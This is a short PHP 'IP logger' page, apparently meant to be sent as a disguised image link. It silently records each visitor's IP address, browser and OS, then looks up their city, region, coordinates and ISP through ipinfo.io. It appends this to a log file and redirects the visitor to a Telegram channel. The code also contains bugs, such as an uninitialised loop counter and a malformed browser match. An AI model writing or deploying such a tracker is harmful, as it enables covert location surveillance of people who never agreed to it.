<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome\n") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный\n";
$newTitle = substr($user_agent, strpos($user_agent, '('));
while(true){
  if($newTitle[$i]==")"){
  $res = substr($newTitle, 1, $i=$i-1);
  break;
  }else{
      $i++;
  }
}
$url = file_get_contents("https://ipinfo.io/$ip/json");
$obj = json_decode($url,true);


$country = $obj['country'];
$region = $obj['region'];
$city = $obj['city'];
$hostname = $obj['hostname'];
$loc = $obj['loc'];
$org = $obj['org'];
$timezona = $obj['timezone'];

$all = "OS: $res\n\rIP: $ip\n\rBrowser: $browser\n\rCity: $city\n\rCountry: $country\n\rRegion: $region\n\rHostName: $hostname\n\rLoc: $loc\n\rORG: $org\n\rTimeZone: $timezona\r";
$fs = fopen("r.log", "a+");
fwrite($fs, $all);
fclose($fs);
header('Location: http://t.me/nights_demons');
?>
<img src="logger.jpg" style="heigt:100%; width:100%;">
